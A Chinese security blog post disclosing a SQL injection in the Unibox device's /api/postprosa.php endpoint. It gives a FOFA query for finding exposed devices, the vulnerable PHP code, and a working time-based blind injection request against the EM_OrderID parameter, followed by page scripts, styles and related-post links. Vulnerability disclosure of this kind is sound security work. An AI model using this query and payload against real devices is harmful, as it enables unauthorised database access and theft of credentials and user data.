---
title: "Unibox postprosa.php sql注入漏洞"
source: https://mrxn.net/jswz/unibox-api-postprosa-sqli.html
asset_dir: assets/unibox-postprosa.php-sql注入漏洞
---

# Unibox postprosa.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/21 08:10
* 899浏览
* [0评论](#comment)
* 35分钟阅读

深入探索

数据库

服务器

sql


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

unibox是一款网络管理设备，提供多种网络管理功能和服务。unibox的 `/api/postprosa.php` 接口处存在SQL注入漏洞，攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

编程

# 影响版本

# fofa语法

> `body="UniBox" || body="UniBox" && body="id=\"index-body\""`

# 漏洞分析

看下 `api/postprosa.php` 的关键业务实现部分

```
<?php

$prosa_response         = $_POST["EM_Response"];
$prosa_total                 = $_POST["EM_Total"];
$prosa_returnOrderID         = $_POST["EM_OrderID"];
$prosa_merchant         = $_POST["EM_Merchant"];
$prosa_store                 = $_POST["EM_Store"];
$prosa_term                 = $_POST["EM_Term"];
$prosa_refNum                 = $_POST["EM_RefNum"];
$prosa_auth                 = $_POST["EM_Auth"];
$prosa_returnDigest         = $_POST["EM_Digest"];

......

if( !empty( $prosa_returnDigest ) )
{
    if($prosa_response != "" )
    {
       switch($prosa_response) {
          case "approved" :
             $prosa_respcode = 1;
             $paymentstatus = 1;
             $proceed = 1;

             $query = "SELECT id,Prosa_OrderId FROM bill_prosa_transaction WHERE Prosa_OrderId = '$prosa_returnOrderID';";
             if($DEBUG_ON)   { debug_line($fp, "\nQuery for duplicate transaction:- ".$query."\n"); }
             $result = @mysql_db_query($mysql_database,$query,$dblink); 
             if($result &&  (@mysql_num_rows($result) > 0))
             {
                $row = @mysql_fetch_array($result);
                $prosa_returnOrderID = $row[ProsaOrderId];
                $duplicateTransaction = 1;
             }
                     $msg = "Transaction Successful";
             break;
          case "denied" :
             $prosa_respcode = 2;
                                $paymentstatus = 0;
                                $msg = "Error: Transaction Denied.";
                                break;

          case "Duplicated transaction" :
             $prosa_respcode = 2;
                                $paymentstatus = 0;
                                $msg = "Error: Duplicate Transaction.";
                                break;

          case "Incorrect information is provided." : //Incorrect information is provided
             $prosa_respcode = 2;
             $paymentstatus = 0;
             $msg = "Error: Incorrect Information is provided.";
             break;

       }  

// 示例1：SELECT 查询
$query = "SELECT id,Prosa_OrderId FROM bill_prosa_transaction WHERE Prosa_OrderId = '$prosa_returnOrderID';";
$result = @mysql_db_query($mysql_database,$query,$dblink);

// 示例2：INSERT 查询
$query = "INSERT INTO bill_prosa_transaction ... VALUES ... '$prosa_merchant', '$prosa_store', ...);";
$result = @mysql_db_query($mysql_database,$query,$dblink);

// 未过滤的用户输入
$prosa_returnOrderID = $_POST["EM_OrderID"];
$prosa_merchant      = $_POST["EM_Merchant"];
$prosa_store         = $_POST["EM_Store"];
// 直接拼接至 SQL 查询（注入点）
$query = "SELECT id,Prosa_OrderId FROM bill_prosa_transaction WHERE Prosa_OrderId = '$prosa_returnOrderID';";
$result = @mysql_db_query($mysql_database,$query,$dblink);
// 其他注入点（INSERT 操作）
$query = "INSERT INTO bill_prosa_transaction ... VALUES ... '$prosa_merchant', '$prosa_store', ...);";
$result = @mysql_db_query($mysql_database,$query,$dblink);
```

用户输入的多个参数（如 EM\_OrderID、EM\_Merchant 等）未经任何过滤直接拼接到SQL查询中，导致攻击者可执行任意SQL命令。

代码安全审计

# 漏洞复现

```
POST /api/postprosa.php HTTP/1.1
Host: unibox.mrxn.net
Content-Type: application/x-www-form-urlencoded

EM_Digest=11&EM_Response=approved&EM_OrderID=1' AND (SELECT 1337 FROM (SELECT(SLEEP(2)))xasd)-- -
```

成功延时 6 秒（执行三次）

[![Unibox postprosa.php sql注入漏洞](images/img-001-22f3f64156a4.webp)](https://image.mrxn.net/82af6ad6bc1a4137b268aec9ab053364.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[Unibox postprosa.php sql注入漏洞](https://mrxn.net/jswz/unibox-api-postprosa-sqli.html)  
文章链接：<https://mrxn.net/jswz/unibox-api-postprosa-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞预警服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/unibox-api-postprosa-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络监控与管理

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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